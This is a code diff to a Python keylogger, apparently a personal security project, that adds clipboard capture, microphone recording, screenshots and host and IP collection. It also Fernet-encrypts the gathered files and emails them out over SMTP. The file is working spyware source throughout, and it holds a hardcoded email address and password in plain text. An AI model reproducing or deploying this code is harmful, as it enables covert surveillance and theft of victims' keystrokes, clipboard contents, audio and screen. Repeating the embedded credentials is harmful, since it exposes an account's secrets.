@@ -31,52 +31,81 @@ from PIL import ImageGrab
 email_address="keiterjoel2@gmail.com"
 password="GodisGreat77."
 email_to="keiterjoel2@gmail.com"
+key=""#Insert key from key gen here
 
 # Create Key log file
 key_info="keys_log.txt"
 system_info="systeminfo.txt"
+clipboard_info="clipboard.txt"
+audio_info="audio.wav"
+screen_info="screenshot.png"
 
+encrypted_key_info="keys_log_encrypted.txt"
+encrypted_system_info="systeminfo_encrypted.txt"
+encrypted_clipboard_info="clipboard_encrypted.txt"
+
+microphone_time=10
 # File path of Key log file
 file_path="D:\Docs\Computing Fundamentals\Python Work\Cybersecurity Projects\Keylogger"
 # Important to access Key log file
 extend="\\"
+file_merge = file_path + extend
 
 counter=0
 # List for storing keys
 keys=[]
 
-def on_press(key):
-    global keys,counter
-    print(key)
-    keys.append(key)
-    counter+=1
+no_of_iterations=0
+time_iteration=15
+current_time=time.time()
+stopping_time=time.time() + time_iteration
+
+
+# Get Clipboard information
+def copy_clipboard():
+ with open(file_path + extend + clipboard_info, 'a') as f:
+   try:
+     win32clipboard.OpenClipboard()
+     pasted_data=win32clipboard.GetClipboardData()
+     win32clipboard.CloseClipboard()
+     f.write("Clipboard Data: \n"+ pasted_data)
+   except:
+     f.write("Clipboard cannot be copied")
+  
+  
+
+# def on_press(key):
+#     global keys,counter
+#     print(key)
+#     keys.append(key)
+#     counter+=1
     
-    if counter >= 1:
-        counter = 0
-        write_to_file(keys)
-        keys=[]
+#     if counter >= 1:
+#         counter = 0
+#         write_to_file(keys)
+#         keys=[]
       
     
-def write_to_file(keys):
-    # Open file and append keys pressed
-    with open(file_path + extend + key_info,"a") as f:
-        for key in keys:
-            r=str(key).replace("'", "")
-            if r.find("space")>0:
-              f.write('\n')
-              f.close()
-            elif r.find("Key")== -1:
-                f.write(r)
-                f.close()
+# def write_to_file(keys):
+#     # Open file and append keys pressed
+#     with open(file_path + extend + key_info,"a") as f:
+#         for key in keys:
+#             r=str(key).replace("'", "")
+#             if r.find("space")>0:
+#               f.write('\n')
+#               f.close()
+#             elif r.find("Key")== -1:
+#                 f.write(r)
+#                 f.close()
                 
             
               
-def on_release(key):
-    if key==Key.esc:
-      return False
+# def on_release(key):
+#     if key==Key.esc:
+#       return False
   
-with Listener(on_press=on_press,on_release=on_release) as listener:
-    listener.join()
+# with Listener(on_press=on_press,on_release=on_release) as listener:
+#     listener.join()
    
         
 # Email Functionality - send keys to email
@@ -115,11 +144,11 @@ def send_email(file_name, attachment,email_to):
     smtp_session.sendmail(email_from,email_to, text)
     
  
-send_email(key_info, file_path + extend + key_info, email_to)
+# send_email(key_info, file_path + extend + key_info, email_to)
 
 
-def system_informaation():
-    with open(file_path, + extend + system_info, "a") as f:
+def system_information():
+    with open(file_path + extend + system_info, "a") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         try:
@@ -128,4 +157,41 @@ def system_informaation():
         except Exception:
           f.write("Failed to get public IP address!")
           
-        f.write("Processor: ")
+        f.write("Processor: " + (platform.processor())+'\n')
+        f.write("System: " + platform.system()+" "+platform.version() + '\n')
+        f.write("Machine: " + platform.machine() +'\n') 
+        f.write("Hostname: " + hostname + '\n')
+        f.write("Private IP Address: " + IPAddr + '\n')
+
+def microphone():
+  freq=44100
+  rec_time=microphone_time
+  recording=sdl.rec(int(rec_time * freq),samplerate=freq,channels=2)
+  sdl.wait()
+  write(file_path + extend + audio_info, freq, recording)
+
+def screenshot():
+  img=ImageGrab.grab()
+  img.save(file_path + extend + screen_info)
+ 
+
+files_to_encrypt=[file_merge+system_info,file_merge+clipboard_info,file_merge+key_info]
+encrypted_file_names=[file_merge+encrypted_key_info, file_merge + encrypted_clipboard_info, file_merge+encrypted_system_info]
+
+counter=0
+for encryption in files_to_encrypt:
+  with open(files_to_encrypt[counter], 'rb') as f:
+    data=f.read()
+    
+    fernet=Fernet(key)
+    encrypted=fernet.encrypt(data)
+    
+  with open(encrypted_file_names[counter], 'wb') as f:
+    f.write(encrypted)
+    
+  send_email(encrypted_file_names[counter], encrypted_file_names[counter],email_to)
+  counter+=1
+time.sleep(120)
+      
+  
+ 
